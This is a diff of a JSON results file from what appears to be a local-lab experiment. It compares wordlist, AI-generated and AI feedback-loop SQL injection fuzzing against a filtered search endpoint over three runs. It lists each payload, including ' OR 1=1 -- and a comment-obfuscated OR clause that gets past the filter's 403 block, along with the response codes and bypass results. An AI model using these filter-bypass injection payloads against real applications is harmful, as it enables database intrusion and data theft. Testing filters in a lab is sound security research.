@@ -1,20 +1,382 @@
 {
-  "branch_1_static_wordlist": {
-    "name": "Wordlist Tĩnh Cổ Điển",
-    "success": false,
-    "requests_sent": 14,
-    "time_seconds": 0.027
-  },
-  "branch_2_static_ai": {
-    "name": "Payload AI Sinh Sẵn (Mức 1)",
-    "success": false,
-    "requests_sent": 6,
-    "time_seconds": 0.002
-  },
-  "branch_3_ai_feedback_loop": {
-    "name": "AI Fuzzer Feedback Loop (Mức 2)",
-    "success": true,
-    "requests_sent": 2,
-    "time_seconds": 0.45
-  }
+  "status": "completed",
+  "target": "http://localhost:3001/api/products?search=",
+  "runs_per_branch": 3,
+  "budget_proposed": 50,
+  "success_definition": "baseline query returns [] and candidate returns HTTP 200 with a non-empty JSON backend result",
+  "rows": [
+    {
+      "branch": "wordlist_static",
+      "run_no": 1,
+      "request_count": 5,
+      "bypass": true,
+      "elapsed_seconds": 0.0833,
+      "attempts": [
+        {
+          "attempt_no": 1,
+          "payload": "' OR 1=1 --",
+          "response_code": 403,
+          "bypass": false,
+          "note": "blocked_or_no_effect"
+        },
+        {
+          "attempt_no": 2,
+          "payload": "' OR '1'='1",
+          "response_code": 403,
+          "bypass": false,
+          "note": "blocked_or_no_effect"
+        },
+        {
+          "attempt_no": 3,
+          "payload": "admin' --",
+          "response_code": 200,
+          "bypass": false,
+          "note": "blocked_or_no_effect"
+        },
+        {
+          "attempt_no": 4,
+          "payload": "' or 'a'='a",
+          "response_code": 403,
+          "bypass": false,
+          "note": "blocked_or_no_effect"
+        },
+        {
+          "attempt_no": 5,
+          "payload": "1' ORDER BY 1--+",
+          "response_code": 200,
+          "bypass": true,
+          "note": "backend_non_empty_result"
+        }
+      ],
+      "mode": "live_local_lab",
+      "baseline_empty": true
+    },
+    {
+      "branch": "ai_static",
+      "run_no": 1,
+      "request_count": 6,
+      "bypass": true,
+      "elapsed_seconds": 0.1022,
+      "attempts": [
+        {
+          "attempt_no": 1,
+          "payload": "' OR '1'='1",
+          "response_code": 403,
+          "bypass": false,
+          "note": "blocked_or_no_effect"
+        },
+        {
+          "attempt_no": 2,
+          "payload": "' OR 1=1 --",
+          "response_code": 403,
+          "bypass": false,
+          "note": "blocked_or_no_effect"
+        },
+        {
+          "attempt_no": 3,
+          "payload": "admin' --",
+          "response_code": 200,
+          "bypass": false,
+          "note": "blocked_or_no_effect"
+        },
+        {
+          "attempt_no": 4,
+          "payload": "1' OR 2>1--",
+          "response_code": 403,
+          "bypass": false,
+          "note": "blocked_or_no_effect"
+        },
+        {
+          "attempt_no": 5,
+          "payload": "1' UNION SELECT null--",
+          "response_code": 403,
+          "bypass": false,
+          "note": "blocked_or_no_effect"
+        },
+        {
+          "attempt_no": 6,
+          "payload": "1'/**/OR/**/'1'='1",
+          "response_code": 200,
+          "bypass": true,
+          "note": "backend_non_empty_result"
+        }
+      ],
+      "mode": "live_local_lab",
+      "baseline_empty": true
+    },
+    {
+      "branch": "ai_feedback",
+      "run_no": 1,
+      "request_count": 2,
+      "bypass": true,
+      "elapsed_seconds": 0.0391,
+      "attempts": [
+        {
+          "attempt_no": 1,
+          "payload": "' OR '1'='1",
+          "response_code": 403,
+          "bypass": false,
+          "note": " OR "
+        },
+        {
+          "attempt_no": 2,
+          "payload": "'/**/OR/**/'1'='1",
+          "response_code": 200,
+          "bypass": true,
+          "note": ""
+        }
+      ],
+      "mode": "live_local_lab_offline_heuristic",
+      "baseline_empty": true
+    },
+    {
+      "branch": "wordlist_static",
+      "run_no": 2,
+      "request_count": 5,
+      "bypass": true,
+      "elapsed_seconds": 0.0627,
+      "attempts": [
+        {
+          "attempt_no": 1,
+          "payload": "' OR 1=1 --",
+          "response_code": 403,
+          "bypass": false,
+          "note": "blocked_or_no_effect"
+        },
+        {
+          "attempt_no": 2,
+          "payload": "' OR '1'='1",
+          "response_code": 403,
+          "bypass": false,
+          "note": "blocked_or_no_effect"
+        },
+        {
+          "attempt_no": 3,
+          "payload": "admin' --",
+          "response_code": 200,
+          "bypass": false,
+          "note": "blocked_or_no_effect"
+        },
+        {
+          "attempt_no": 4,
+          "payload": "' or 'a'='a",
+          "response_code": 403,
+          "bypass": false,
+          "note": "blocked_or_no_effect"
+        },
+        {
+          "attempt_no": 5,
+          "payload": "1' ORDER BY 1--+",
+          "response_code": 200,
+          "bypass": true,
+          "note": "backend_non_empty_result"
+        }
+      ],
+      "mode": "live_local_lab",
+      "baseline_empty": true
+    },
+    {
+      "branch": "ai_static",
+      "run_no": 2,
+      "request_count": 6,
+      "bypass": true,
+      "elapsed_seconds": 0.0312,
+      "attempts": [
+        {
+          "attempt_no": 1,
+          "payload": "' OR '1'='1",
+          "response_code": 403,
+          "bypass": false,
+          "note": "blocked_or_no_effect"
+        },
+        {
+          "attempt_no": 2,
+          "payload": "' OR 1=1 --",
+          "response_code": 403,
+          "bypass": false,
+          "note": "blocked_or_no_effect"
+        },
+        {
+          "attempt_no": 3,
+          "payload": "admin' --",
+          "response_code": 200,
+          "bypass": false,
+          "note": "blocked_or_no_effect"
+        },
+        {
+          "attempt_no": 4,
+          "payload": "1' OR 2>1--",
+          "response_code": 403,
+          "bypass": false,
+          "note": "blocked_or_no_effect"
+        },
+        {
+          "attempt_no": 5,
+          "payload": "1' UNION SELECT null--",
+          "response_code": 403,
+          "bypass": false,
+          "note": "blocked_or_no_effect"
+        },
+        {
+          "attempt_no": 6,
+          "payload": "1'/**/OR/**/'1'='1",
+          "response_code": 200,
+          "bypass": true,
+          "note": "backend_non_empty_result"
+        }
+      ],
+      "mode": "live_local_lab",
+      "baseline_empty": true
+    },
+    {
+      "branch": "ai_feedback",
+      "run_no": 2,
+      "request_count": 2,
+      "bypass": true,
+      "elapsed_seconds": 0.0154,
+      "attempts": [
+        {
+          "attempt_no": 1,
+          "payload": "' OR '1'='1",
+          "response_code": 403,
+          "bypass": false,
+          "note": " OR "
+        },
+        {
+          "attempt_no": 2,
+          "payload": "'/**/OR/**/'1'='1",
+          "response_code": 200,
+          "bypass": true,
+          "note": ""
+        }
+      ],
+      "mode": "live_local_lab_offline_heuristic",
+      "baseline_empty": true
+    },
+    {
+      "branch": "wordlist_static",
+      "run_no": 3,
+      "request_count": 5,
+      "bypass": true,
+      "elapsed_seconds": 0.0336,
+      "attempts": [
+        {
+          "attempt_no": 1,
+          "payload": "' OR 1=1 --",
+          "response_code": 403,
+          "bypass": false,
+          "note": "blocked_or_no_effect"
+        },
+        {
+          "attempt_no": 2,
+          "payload": "' OR '1'='1",
+          "response_code": 403,
+          "bypass": false,
+          "note": "blocked_or_no_effect"
+        },
+        {
+          "attempt_no": 3,
+          "payload": "admin' --",
+          "response_code": 200,
+          "bypass": false,
+          "note": "blocked_or_no_effect"
+        },
+        {
+          "attempt_no": 4,
+          "payload": "' or 'a'='a",
+          "response_code": 403,
+          "bypass": false,
+          "note": "blocked_or_no_effect"
+        },
+        {
+          "attempt_no": 5,
+          "payload": "1' ORDER BY 1--+",
+          "response_code": 200,
+          "bypass": true,
+          "note": "backend_non_empty_result"
+        }
+      ],
+      "mode": "live_local_lab",
+      "baseline_empty": true
+    },
+    {
+      "branch": "ai_static",
+      "run_no": 3,
+      "request_count": 6,
+      "bypass": true,
+      "elapsed_seconds": 0.0356,
+      "attempts": [
+        {
+          "attempt_no": 1,
+          "payload": "' OR '1'='1",
+          "response_code": 403,
+          "bypass": false,
+          "note": "blocked_or_no_effect"
+        },
+        {
+          "attempt_no": 2,
+          "payload": "' OR 1=1 --",
+          "response_code": 403,
+          "bypass": false,
+          "note": "blocked_or_no_effect"
+        },
+        {
+          "attempt_no": 3,
+          "payload": "admin' --",
+          "response_code": 200,
+          "bypass": false,
+          "note": "blocked_or_no_effect"
+        },
+        {
+          "attempt_no": 4,
+          "payload": "1' OR 2>1--",
+          "response_code": 403,
+          "bypass": false,
+          "note": "blocked_or_no_effect"
+        },
+        {
+          "attempt_no": 5,
+          "payload": "1' UNION SELECT null--",
+          "response_code": 403,
+          "bypass": false,
+          "note": "blocked_or_no_effect"
+        },
+        {
+          "attempt_no": 6,
+          "payload": "1'/**/OR/**/'1'='1",
+          "response_code": 200,
+          "bypass": true,
+          "note": "backend_non_empty_result"
+        }
+      ],
+      "mode": "live_local_lab",
+      "baseline_empty": true
+    },
+    {
+      "branch": "ai_feedback",
+      "run_no": 3,
+      "request_count": 2,
+      "bypass": true,
+      "elapsed_seconds": 0.0605,
+      "attempts": [
+        {
+          "attempt_no": 1,
+          "payload": "' OR '1'='1",
+          "response_code": 403,
+          "bypass": false,
+          "note": " OR "
+        },
+        {
+          "attempt_no": 2,
+          "payload": "'/**/OR/**/'1'='1",
+          "response_code": 200,
+          "bypass": true,
+          "note": ""
+        }
+      ],
+      "mode": "live_local_lab_offline_heuristic",
+      "baseline_empty": true
+    }
+  ],
+  "generated_at_utc": "2026-10-17T13:52:29Z"
 }
